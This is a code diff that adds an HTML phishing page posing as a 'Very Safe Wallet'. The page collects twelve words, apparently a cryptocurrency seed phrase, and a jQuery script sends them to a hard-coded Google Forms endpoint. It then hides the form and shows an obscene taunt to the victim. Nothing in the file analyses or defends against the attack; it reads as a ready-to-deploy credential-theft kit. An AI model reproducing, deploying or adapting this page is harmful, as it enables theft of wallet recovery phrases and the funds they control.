@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+<style>
+body {font-family: Arial, Helvetica, sans-serif;}
+form {border: 3px solid #f1f1f1;}
+
+input[type=text], input[type=email], select {
+  width: 49%;
+  font-size:20px;
+  padding: 12px 20px;
+  margin: 8px 0;
+  display: inline-block;
+  border: 1px solid #ccc;
+  box-sizing: border-box;
+}
+
+button {
+  background-color: #4CAF50;
+  color: white;
+  padding: 14px 20px;
+  margin: 8px 0;
+  border: none;
+  cursor: pointer;
+  width: 100%;
+}
+
+button:hover {
+  opacity: 0.8;
+}
+
+.cancelbtn {
+  width: auto;
+  padding: 10px 18px;
+  background-color: #f44336;
+}
+
+.imgcontainer {
+  text-align: center;
+  margin: 24px 0 12px 0;
+}
+
+img.avatar {
+  width: 20%;
+  border-radius: 50%;
+}
+
+.container {
+  padding: 16px;
+}
+
+span.psw {
+  float: right;
+  padding-top: 16px;
+}
+
+/* Change styles for span and cancel button on extra small screens */
+@media screen and (max-width: 300px) {
+  span.psw {
+     display: block;
+     float: none;
+  }
+  .cancelbtn {
+     width: 100%;
+  }
+}
+</style>
+</head>
+<body style="background:#000;">
+
+<center><h1 style="color:#fff">Very Safe Wallet</h1></center>
+
+<form id="form" target="_self" onsubmit="return postToGoogle();" action="" autocomplete="off"> 
+<input id="oneField" name="entry.2008660880" placeholder="1" type="text" required> 
+<input id="twoField" name="entry.2008660880" placeholder="2" type="text" required> 
+<input id="threeField" name="entry.2008660880" placeholder="3" type="text" required> 
+<input id="fourField" name="entry.2008660880" placeholder="4" type="text" required> 
+<input id="fiveField" name="entry.2008660880" placeholder="5" type="text" required> 
+<input id="sixField" name="entry.2008660880" placeholder="6" type="text" required> 
+<input id="sevenField" name="entry.2008660880" placeholder="7" type="text" required> 
+<input id="eightField" name="entry.2008660880" placeholder="8" type="text" required> 
+<input id="nineField" name="entry.2008660880" placeholder="9" type="text" required> 
+<input id="tenField" name="entry.2008660880" placeholder="10" type="text" required>
+<input id="elevenField" name="entry.2008660880" placeholder="11" type="text" required> 
+<input id="twelveField" name="entry.2008660880" placeholder="12" type="text" required>  
+ 
+
+<button id="send" type="submit" class="common_btn">Submit</button>
+</form>
+
+<h3 id="success-msg" style="text-align: center !important; margin-top:190px !important; display:none; color:#fff"> Suck my Cock</h3>
+
+
+
+<img src="wan.jpg" style="width:100%; opacity:.4;">
+
+
+
+
+<script>
+function postToGoogle() {
+                var field1 = $("#oneField").val();
+                var field2 = $("#twoField").val();
+                var field3 = $("#threeField").val();
+                var field4 = $("#fourField").val();
+                var field5 = $("#fiveField").val();
+                var field6 = $("#sixField").val();
+                var field7 = $("#sevenField").val();
+                var field8 = $("#eightField").val();
+                var field9 = $("#nineField").val();
+                var field10 = $("#tenField").val();
+                var field11 = $("#elevenField").val();
+                var field12 = $("#twelveField").val();
+                
+ 				
+				if(field1 == ""){
+					alert('1');
+					document.getElementById("oneField").focus();
+					return false;
+				}
+				if(field2 == ""){
+					alert('2');
+					document.getElementById("twoField").focus();
+					return false;
+				}
+        if(field3 == ""){
+					alert('3');
+					document.getElementById("threeField").focus();
+					return false;
+				}
+        if(field4 == ""){
+					alert('4');
+					document.getElementById("fourField").focus();
+					return false;
+				}
+        if(field5 == ""){
+					alert('5');
+					document.getElementById("fiveField").focus();
+					return false;
+				}
+        if(field6 == ""){
+					alert('6');
+					document.getElementById("sixField").focus();
+					return false;
+				}
+        if(field7 == ""){
+					alert('7');
+					document.getElementById("sevenField").focus();
+					return false;
+				}
+        if(field8 == ""){
+					alert('8');
+					document.getElementById("eightField").focus();
+					return false;
+				}
+        if(field9 == ""){
+					alert('9');
+					document.getElementById("nineField").focus();
+					return false;
+				}
+        if(field10 == ""){
+					alert('10');
+					document.getElementById("tenField").focus();
+					return false;
+				}
+        if(field11 == ""){
+					alert('11');
+					document.getElementById("elevenField").focus();
+					return false;
+				}
+        if(field12 == ""){
+					alert('12');
+					document.getElementById("twelveField").focus();
+					return false;
+				}
+			
+
+
+				
+	
+                $.ajax({
+                    url: "https://docs.google.com/forms/d/1djsilnjvYp8kop70x03VA3KSK3_xSdhFm6_gJLuUlW8/formResponse?",
+					data: {"entry.519053992": field1, "entry.323784251": field2, "entry.2060607243": field3, "entry.2008094664": field4, "entry.588043467": field5, "entry.662356950": field6, "entry.331958900": field7, "entry.1700832610": field8, "entry.1087794664": field9, "entry.1929471749": field10, "entry.506444797": field11, "entry.1892197561": field12},
+                    type: "POST",
+                    dataType: "xml",
+                    success: function(d)
+					{
+					},
+					error: function(x, y, z)
+						{
+
+							$('#success-msg').show();
+							$('#form').hide();
+							
+						}
+                });
+				return false;
+            }
+</script>
+</body>
+</html>
